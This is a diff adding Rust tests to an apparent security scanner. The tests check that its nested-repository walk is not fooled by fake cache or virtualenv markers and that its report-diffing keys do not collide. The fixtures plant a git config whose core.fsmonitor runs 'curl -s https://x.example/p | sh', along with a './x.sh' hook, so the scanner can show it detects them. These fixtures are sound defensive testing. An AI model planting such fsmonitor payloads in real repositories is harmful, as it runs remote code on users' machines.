@@ -2825,6 +2825,33 @@ fn diff_composite_key_distinguishes_same_name_servers() {
     );
 }
 
+/// A natural diff key equal to a synthesised one (`a|x` beside two `a` rows told apart by
+/// `ide_type` x / y; `b#2` beside two identical `b` rows) is its own row: on b21286f the
+/// later row overwrote the earlier in one string-keyed map, so two of six added rows
+/// vanished and a version change of the shadowed `a` (ide x) row never showed.
+#[test]
+fn diff_synthesised_keys_never_overwrite_natural_keys() {
+    let report = |rows: serde_json::Value| serde_json::json!({"ide_extensions": rows});
+    let rows = |ax: &str| {
+        serde_json::json!([
+            {"id": "a", "ide_type": "x", "version": ax},
+            {"id": "a", "ide_type": "y", "version": "1"},
+            {"id": "a|x", "version": "1"},
+            {"id": "b", "version": "1"},
+            {"id": "b", "version": "1"},
+            {"id": "b#2", "version": "1"}
+        ])
+    };
+    let diff = diff_reports(&report(serde_json::json!([])), &report(rows("1")));
+    let ide = diff.sections.iter().find(|s| s.name == "IDE Extensions").unwrap();
+    assert_eq!(ide.added.len(), 6, "{:?}", ide.added);
+    let diff = diff_reports(&report(rows("1")), &report(rows("2")));
+    let ide = diff.sections.iter().find(|s| s.name == "IDE Extensions").unwrap();
+    assert!(ide.added.is_empty() && ide.removed.is_empty(), "{ide:?}");
+    assert_eq!(ide.changed.len(), 1, "{ide:?}");
+    assert_eq!(ide.changed[0].changes, vec!["version: 1 -> 2".to_string()], "{ide:?}");
+}
+
 #[test]
 fn json_error_output_is_valid_json() {
     // The JSON error fallback should always produce valid JSON
@@ -5930,19 +5957,23 @@ fn json_report_lists_every_scanner_in_diagnostics() {
 
 /// Pruning must be by generator MARKER, not by name: `target/` and `env/` are plausible
 /// tracked directory names, and the attacker picks the layout. A gitdir under a tracked
-/// `target/` is found; the same gitdir under a cargo `target/` (CACHEDIR.TAG present)
-/// and under `node_modules/` is skipped as generated content.
+/// `target/` is found; the same gitdir under a cargo `target/` (a signed CACHEDIR.TAG,
+/// https://bford.info/cachedir/), a real virtualenv (`pyvenv.cfg` with `home = `) and
+/// `node_modules/` is skipped as generated content. A marker that is only a NAME (an
+/// empty or unsigned CACHEDIR.TAG, an empty pyvenv.cfg, a symlinked tag) prunes nothing
+/// (review of b21286f).
 #[test]
 fn nested_repo_pruning_is_by_marker_not_by_name() {
-    fn plant(root: &std::path::Path, rel: &str, marker: Option<&str>) {
+    const SIGNED: &str = "Signature: 8a477f597d28d172789f06886806bc55\n# This file is a cache directory tag.\n";
+    fn plant(root: &std::path::Path, rel: &str, marker: Option<(&str, &str)>) {
         let parent = root.join(rel);
         let git = parent.join("payload");
         std::fs::create_dir_all(git.join("objects")).unwrap();
         std::fs::create_dir_all(git.join("refs")).unwrap();
         std::fs::write(git.join("HEAD"), "ref: refs/heads/main\n").unwrap();
         std::fs::write(git.join("config"), "[core]\n\tfsmonitor = \"./x.sh\"\n").unwrap();
-        if let Some(m) = marker {
-            std::fs::write(parent.join(m), "").unwrap();
+        if let Some((m, text)) = marker {
+            std::fs::write(parent.join(m), text).unwrap();
         }
     }
     let root = &std::env::temp_dir().join(format!("rmg-prune-{}", std::process::id()));
@@ -5950,9 +5981,21 @@ fn nested_repo_pruning_is_by_marker_not_by_name() {
     std::fs::create_dir_all(root).unwrap();
     plant(root, "target", None); // tracked dir that happens to be named target
     plant(root, "env", None); // ditto
-    plant(root, "build/target", Some("CACHEDIR.TAG")); // real cargo/cache output
-    plant(root, "venv", Some("pyvenv.cfg")); // real virtualenv
+    plant(root, "build/target", Some(("CACHEDIR.TAG", SIGNED))); // real cargo/cache output
+    plant(
+        root,
+        "venv",
+        Some(("pyvenv.cfg", "home = /usr/bin\nversion = 3.12.4\n")),
+    ); // real virtualenv
     plant(root, "node_modules/x", None); // dependency tree, by name
+    plant(root, "fake-tag", Some(("CACHEDIR.TAG", ""))); // a name, not a tag
+    plant(root, "unsigned-tag", Some(("CACHEDIR.TAG", "Signature: 0000\n")));
+    plant(root, "fake-venv", Some(("pyvenv.cfg", "")));
+    plant(root, "fake-venv2", Some(("pyvenv.cfg", "version = 3.12\n")));
+    plant(root, "linked-tag", None);
+    std::fs::write(root.join("signed.tag"), SIGNED).unwrap();
+    #[cfg(unix)]
+    std::os::unix::fs::symlink(root.join("signed.tag"), root.join("linked-tag/CACHEDIR.TAG")).unwrap();
     let mut out = Vec::new();
     rustmachineguard::scanners::git_config::scan_nested_repos_for_test(root, &mut out);
     let found: Vec<String> = out.iter().map(|c| c.origin.clone()).collect();
@@ -5962,10 +6005,62 @@ fn nested_repo_pruning_is_by_marker_not_by_name() {
     assert!(has("/env/payload"), "tracked env/ must be scanned: {found:?}");
     assert!(
         !has("/build/target/payload"),
-        "CACHEDIR.TAG tree must be skipped: {found:?}"
+        "signed CACHEDIR.TAG tree must be skipped: {found:?}"
     );
     assert!(!has("/venv/payload"), "pyvenv.cfg tree must be skipped: {found:?}");
     assert!(!has("node_modules"), "node_modules must be skipped: {found:?}");
+    for walked in ["/fake-tag/", "/unsigned-tag/", "/fake-venv/", "/fake-venv2/"] {
+        assert!(has(walked), "{walked}: an invalid marker must not prune: {found:?}");
+    }
+    #[cfg(unix)]
+    assert!(
+        has("/linked-tag/"),
+        "a symlinked CACHEDIR.TAG is not read and prunes nothing: {found:?}"
+    );
+}
+
+/// The walk ROOT is never pruned, whatever marker it holds (review of b21286f: a
+/// committed `CACHEDIR.TAG` at a project's top hid `vendor/evil`, a bare repo with a
+/// `core.fsmonitor` payload, with nothing marked truncated). Signed or not, the tag at the
+/// root changes nothing; the same signed tag one level down still prunes.
+#[test]
+fn nested_repo_walk_never_prunes_its_root() {
+    let root = &std::env::temp_dir().join(format!("rmg-prune-root-{}", std::process::id()));
+    let _ = std::fs::remove_dir_all(root);
+    let git = root.join("vendor/evil");
+    std::fs::create_dir_all(git.join("objects")).unwrap();
+    std::fs::create_dir_all(git.join("refs")).unwrap();
+    std::fs::write(git.join("HEAD"), "ref: refs/heads/main\n").unwrap();
+    std::fs::write(
+        git.join("config"),
+        "[core]\n\tfsmonitor = curl -s https://x.example/p | sh\n",
+    )
+    .unwrap();
+    for (tag, venv) in [
+        ("", ""),
+        ("Signature: 8a477f597d28d172789f06886806bc55\n", "home = /usr/bin\n"),
+    ] {
+        std::fs::write(root.join("CACHEDIR.TAG"), tag).unwrap();
+        std::fs::write(root.join("pyvenv.cfg"), venv).unwrap();
+        let mut out = Vec::new();
+        let (_, pruned) = rustmachineguard::scanners::git_config::nested_walk_counts_for_test(root, &mut out);
+        assert_eq!(pruned, 0, "tag {tag:?}");
+        assert!(
+            out.iter()
+                .any(|c| c.path.ends_with("/vendor/evil") && c.key == "core.fsmonitor"),
+            "tag {tag:?}: the buried repo under a tagged root was hidden: {out:?}"
+        );
+    }
+    std::fs::write(
+        root.join("vendor/CACHEDIR.TAG"),
+        "Signature: 8a477f597d28d172789f06886806bc55\n",
+    )
+    .unwrap();
+    let mut out = Vec::new();
+    let (_, pruned) = rustmachineguard::scanners::git_config::nested_walk_counts_for_test(root, &mut out);
+    let _ = std::fs::remove_dir_all(root);
+    assert_eq!(pruned, 1);
+    assert!(out.is_empty(), "a signed tag below the root still prunes: {out:?}");
 }
 
 /// A cargo `target/` (a `CACHEDIR.TAG` at its top, https://bford.info/cachedir/) is listed
